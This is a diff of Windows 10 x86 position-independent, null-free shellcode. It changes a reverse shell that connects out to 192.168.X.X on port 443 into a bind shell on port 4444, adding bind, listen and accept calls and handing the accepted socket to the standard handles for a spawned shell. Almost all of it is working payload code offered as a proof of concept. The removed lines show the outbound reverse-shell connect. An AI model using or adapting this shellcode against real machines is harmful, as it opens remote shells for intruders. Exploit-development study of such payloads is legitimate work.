@@ -1,10 +1,10 @@
-; Windows 10 x86 - Reverse Shell + Position-Independent Code (PIC) + Null-Free Shellcode (231 Bytes)
-; Author: @thecyberbebop, Shadi Habbal (@kerpanic)
-; Date: 2020-07-01
+; Windows 10 x86 - Bind Shell + Position-Independent Code (PIC) + Null-Free Shellcode (258 Bytes)
+; Author: @thecyberbebop
+; Date: 2020-07-11
 ; Technique: PEB & Export Table Directory
 ; Tested On: Windows 10 Pro (x86) 10.0.16299 Build 16299, Windows 10 Pro (x64) 10.0.19041 Build 19041
 ; Assumptions: Application should already have ws2_32.dll loaded if sending the payload to a windows socket
-; Credits: @offsectraining, @metasploit, Ionut Popescu, @spotheplanet, @h0mbre_, @epi052
+; Credits: @offsectraining, @metasploit, Ionut Popescu, @kerpanic, @spotheplanet, @h0mbre_, @epi052
 ; Note: Remember to update the symbols hash values, port, and IP address in this PoC to whatever you are using!
 
     start:
@@ -101,7 +101,7 @@
         push ecx                        ; Push dwFlags
         push ecx                        ; Push g
         push ecx                        ; Push lpProtocolInfo
-        push ecx                        ; Push protocol -- NULL per MSDN (service provider will choose the protocol to use)
+        push 0x6                        ; Push protocol -- 0x6 (IPPROTO_TCP)
         push 0x1                        ; Push type -- 0x1 (SOCK_STREAM)
         push 0x2                        ; Push af -- 0x02 (AF_INET)
         push 0xadf509d9                 ; WSASocketA() hash
@@ -110,36 +110,55 @@
     ; EAX = SOCKET descriptor
     ; EBX = ws2_32.dll DllBase
 
-    call_connect:
-        push eax                        ; Push hStdError (SOCKET descriptor) for create_startupinfoa
-        push eax                        ; Push hStdOutput (SOCKET descriptor) for create_startupinfoa
-        push eax                        ; Push hStdInput (SOCKET descriptor) for create_startupinfoa
+    call_bind:
+        push eax                        ; Push SOCKET discriptor for listen() and accept()
         cdq                             ; EDX = 0 (Assumes sign bit is NOT set in EAX -- SOCKET discriptor in EAX)
         push edx                        ; Push sin_zero[] (must be 0)
         push edx                        ; Push sin_zero[] (must be 0)
-        push 0xXXXXa8c0                 ; Push sin_addr (192.168.X.X)
-        mov edi, 0x44fefffd             ; EDI = sin_port and sin_family (avoid NULL)
-        not edi                         ; 0xbb010002 -- sin_port 0xbb01 (443) and 0x2 (sin_family & AF_INET)
-        push edi                        ; push sin_port and sin_family
+        push edx                        ; Push sin_addr (0.0.0.0)
+        mov edi, 0xa3eefffd             ; EDI = sin_port and sin_family (avoid NULL)
+        not edi                         ; 0x5c110002 -- sin_port 0x5c11 (4444) and 0x2 (sin_family & AF_INET)
+        push edi                        ; Push sin_port and sin_family
         push esp                        ; Push pointer to the sockaddr_in structure
         pop edi                         ; EDI = Pointer to the sockaddr_in structure
         push 0x10                       ; Push namelen (size of sockaddr_in structure)
         push edi                        ; Push *name
         push eax                        ; Push s
-        push 0x60aaf9ec                 ; connect() hash
+        push 0xc7701aa4                 ; bind() hash
         call find_function_start        ; Call find_function_start
 
     ; EAX = 0
-    ; EDX = 0
+    ; EBX = ws2_32.dll DllBase
+
+    call_listen:
+        push eax                        ; backlog
+        push [esp + 0x14]               ; s (SOCKET discriptor)
+        push 0xe92eada4                 ; listen() hash
+        call find_function_start        ; Call find_function_start
+
+    ; EAX = 0
+    ; EBX = ws2_32.dll DllBase
+
+    call_accept:
+        push eax                        ; addrlen (NULL -- optional per MSDN)
+        push eax                        ; *addr (NULL -- optional per MSDN)
+        push [esp + 0x18]               ; s (SOCKET discriptor)
+        push 0x498649e5                 ; accept() hash
+        call find_function_start        ; Call find_function_start
+
+    ; EAX = SOCKET descriptor
 
     create_startupinfoa:
-        add esp, 0x10                   ; Return the Stack to our 3 previous SOCKET descriptor pushes
+        push eax                        ; Push hStdError (SOCKET descriptor) from accept()
+        push eax                        ; Push hStdOutput (SOCKET descriptor) from accept()
+        push eax                        ; Push hStdInput (SOCKET descriptor) from accept()
+        cdq                             ; EDX = 0 (Assumes sign bit is NOT set in EAX -- SOCKET discriptor in EAX)        
         push edx                        ; Push lpReserved2 (NULL)
         push edx                        ; push cbReserved2 & wShowWindow (NULL)
         mov dl, 0xff                    ; DL = 0xff
         inc edx                         ; EDX = 0x100
         push edx                        ; Push dwFlags
-        cdq                             ; EDX = 0
+        cdq                             ; EDX = 0 (Assumes sign bit is NOT set in EAX -- SOCKET discriptor in EAX)
         push 0xa                        ; Setup our loop counter
         pop ecx                         ; ECX = 0xa (10)
       startupinfoa_loop:                 
